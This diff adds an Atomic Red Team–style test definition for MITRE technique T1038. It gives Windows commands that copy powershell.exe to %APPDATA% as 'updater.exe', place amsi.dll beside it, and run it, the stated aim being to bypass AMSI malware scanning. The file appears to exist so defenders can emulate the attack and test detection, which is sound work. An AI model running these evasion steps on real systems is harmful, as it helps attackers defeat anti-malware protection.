@@ -1,0 +1,21 @@
+---
+attack_technique: T1038
+display_name: DLL Search Order Hijacking
+
+atomic_tests:
+- name: DLL Search Order Hijacking - amsi.dll
+  description: |
+    Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version
+    of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)
+    https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/
+
+  supported_platforms:
+    - windows
+
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: |
+      copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
+      copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
+      cmd.exe /k %APPDATA%\updater.exe
